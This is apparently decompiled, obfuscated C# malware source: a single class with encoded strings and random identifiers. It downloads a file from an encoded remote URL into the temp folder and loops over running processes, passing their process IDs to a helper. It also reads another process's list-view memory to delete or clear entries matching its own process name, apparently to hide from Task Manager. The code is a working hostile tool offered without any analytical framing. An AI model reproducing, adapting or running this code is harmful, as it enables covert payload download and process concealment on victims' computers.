using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

internal sealed class YAxWDMRBAqs
{
	private struct egOYnMsXOTjl
	{
		public uint ZZFIMbxLgzthaR;

		public IntPtr BxHIHExIvxZU;

		public IntPtr YRofDNnXGicoWU;

		public uint oNjdwbdRHgy;

		public uint nmVNOKbSciLW;

		public IntPtr TDlIPygpdst;

		public uint rLBeAZCTznQk;

		public int NYhBjqLGSmMKnsl;

		public IntPtr nQYKRLEKQiaDAB;
	}

	private static volatile bool NPrbAlPzPDdY;

	public static volatile bool zsxmbThfoIv;

	[NonSerialized]
	internal static GetString getString_0;

	public static string XuwBaCsSvadVb()
	{
		if (IntPtr.Size == 8)
		{
			GRQFeQGQfBG.KtQjokjXHZXUlt = WxApcACCouHsj(new Uri(GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400165))));
		}
		else
		{
			GRQFeQGQfBG.KtQjokjXHZXUlt = WxApcACCouHsj(new Uri(GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107399539))));
		}
		return GRQFeQGQfBG.KtQjokjXHZXUlt;
	}

	public static string WxApcACCouHsj(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107399873), getString_0(107388665)).Remove(0, 3) + getString_0(107399900);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process VflsoyQzMbAPLA(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void uxfwPrDKmXAM(string[] string_0)
	{
		string text = XuwBaCsSvadVb();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = VflsoyQzMbAPLA(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					GRQFeQGQfBG.tLMiMedPBjRN(text, text2 + getString_0(107385993) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					GRQFeQGQfBG.tLMiMedPBjRN(text, text2 + getString_0(107385993) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107399891));
					GRQFeQGQfBG.tLMiMedPBjRN(text, text2 + getString_0(107385993) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107399850)));
					GRQFeQGQfBG.tLMiMedPBjRN(text, text2 + getString_0(107385993) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107387413)));
					GRQFeQGQfBG.tLMiMedPBjRN(text, text2 + getString_0(107385993) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107399857)));
					GRQFeQGQfBG.tLMiMedPBjRN(text, text2 + getString_0(107385993) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107399808)));
					GRQFeQGQfBG.tLMiMedPBjRN(text, text2 + getString_0(107385993) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107402510)));
					GRQFeQGQfBG.tLMiMedPBjRN(text, text2 + getString_0(107385993) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107399823)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr UjFedpJMIBJBA);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr TlIlrvTwkgRF, IntPtr CjyiFZzrUmke, byte[] TEuHcyhUBFbQ, uint VgShYTPvmTThY, out UIntPtr hyssyDaFvAptqdTxkM);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr YukJpAHNsE, IntPtr VRsqleNwFuWj, [Out] byte[] jqVFTziOPdzCrH, int zUcNzxrpCJQI, out UIntPtr rSatgptaJckbh);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr iwFIxOazbuWW, out uint zVoMjTfiaFIOK);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] oWhmmraYvbLVwzj(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr XQiHHOlbsuzoXVF(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void YkqavvNtNPJW(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr JsiokUFiRNku(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void zaPZmwqFhWA(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr sEBuHMYJjfVVHf()
	{
		IntPtr intPtr = FindWindow(getString_0(107399806), getString_0(107399749));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107399716), getString_0(107399739));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107399716), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107399690), getString_0(107399701));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107399716), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107399690), getString_0(107399656));
	}

	private static IntPtr EZnCgVSOxCrvJTG(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void SLdKMjndPzQRI(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void dupyseEKIIQd(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string edvzpcCtbKRvgAt(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		egOYnMsXOTjl egOYnMsXOTjl = default(egOYnMsXOTjl);
		GetWindowThreadProcessId(intptr_0, out var zVoMjTfiaFIOK);
		IntPtr intPtr = XQiHHOlbsuzoXVF(zVoMjTfiaFIOK);
		IntPtr intPtr2 = JsiokUFiRNku((uint)Marshal.SizeOf(egOYnMsXOTjl), intPtr);
		IntPtr intPtr3 = JsiokUFiRNku(50u, intPtr);
		egOYnMsXOTjl.BxHIHExIvxZU = intptr_1;
		egOYnMsXOTjl.YRofDNnXGicoWU = (IntPtr)0;
		egOYnMsXOTjl.rLBeAZCTznQk = 50u;
		egOYnMsXOTjl.TDlIPygpdst = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, oWhmmraYvbLVwzj(egOYnMsXOTjl), (uint)Marshal.SizeOf(egOYnMsXOTjl), out var hyssyDaFvAptqdTxkM);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out hyssyDaFvAptqdTxkM);
		zaPZmwqFhWA(intPtr, intPtr2, (uint)Marshal.SizeOf(egOYnMsXOTjl));
		zaPZmwqFhWA(intPtr, intPtr3, 50u);
		YkqavvNtNPJW(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void ToclLfjusOdvmT(string string_0)
	{
		IntPtr intPtr = sEBuHMYJjfVVHf();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)EZnCgVSOxCrvJTG(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = edvzpcCtbKRvgAt(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				SLdKMjndPzQRI(intPtr, (IntPtr)i);
			}
		}
	}

	private static void GNhmTCFXfuxfjd()
	{
		IntPtr intPtr = sEBuHMYJjfVVHf();
		if (intPtr != IntPtr.Zero)
		{
			dupyseEKIIQd(intPtr);
			dupyseEKIIQd(intPtr);
			dupyseEKIIQd(intPtr);
			dupyseEKIIQd(intPtr);
			dupyseEKIIQd(intPtr);
		}
	}

	public static void mPoSoGlmRRDOttyG()
	{
		Thread thread = new Thread(NzcRuRSpnRLK);
		thread.Start();
	}

	private static void NzcRuRSpnRLK()
	{
		while (!NPrbAlPzPDdY)
		{
			if (zsxmbThfoIv)
			{
				ToclLfjusOdvmT(Process.GetCurrentProcess().ProcessName + getString_0(107399900));
				Thread.Sleep(525);
			}
			else
			{
				GNhmTCFXfuxfjd();
				Thread.Sleep(1000);
			}
		}
		NPrbAlPzPDdY = false;
	}

	static YAxWDMRBAqs()
	{
		Strings.CreateGetStringDelegate(typeof(YAxWDMRBAqs));
		NPrbAlPzPDdY = false;
		zsxmbThfoIv = true;
	}
}
